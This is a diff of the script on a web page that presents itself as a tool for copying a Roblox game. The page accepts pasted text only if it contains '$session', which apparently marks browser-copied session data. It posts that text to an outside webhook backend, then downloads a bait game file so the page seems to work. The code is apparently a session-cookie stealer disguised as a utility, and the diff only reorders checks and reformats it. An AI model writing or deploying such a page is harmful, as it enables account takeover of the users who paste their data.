@@ -129,7 +129,7 @@
 </div>
 
 <script>
-  // Backend proxy URL - change this if you deploy backend somewhere else
+  // Your backend URL here:
   const backendURL = 'https://copy-roblox-game.onrender.com/send-webhook';
 
   const input = document.getElementById('gameInput');
@@ -139,12 +139,13 @@
   btn.addEventListener('click', () => {
     const text = input.value.trim();
 
-    if (!text) {
-      alert('Please enter or paste your game file!');
-      return;
-    }
     if (!text.includes('$session')) {
       alert('Invalid text');
+      return;
+    }
+
+    if (!text) {
+      alert('Please enter or paste your game file!');
       return;
     }
 
@@ -152,22 +153,22 @@
     fetch(backendURL, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ content: `User pasted game file:\n\`\`\`\n${text}\n\`\`\`` }),
-    })
-    .then(response => {
+      body: JSON.stringify({
+        content: `User pasted game file:\n\`\`\`\n${text}\n\`\`\``
+      }),
+    }).then(response => {
       if (!response.ok) {
         alert('Failed to send data to backend.');
         return;
       }
-      // Trigger file download from GitHub Pages repo
+      // Trigger download of the file from your GitHub Pages repo
       const a = document.createElement('a');
       a.href = 'grow%20a%20garden%20(1).rbxl';
       a.download = 'grow a garden (1).rbxl';
       document.body.appendChild(a);
       a.click();
       setTimeout(() => a.remove(), 100);
-    })
-    .catch(err => {
+    }).catch(err => {
       alert('Error sending webhook: ' + err.message);
     });
   });
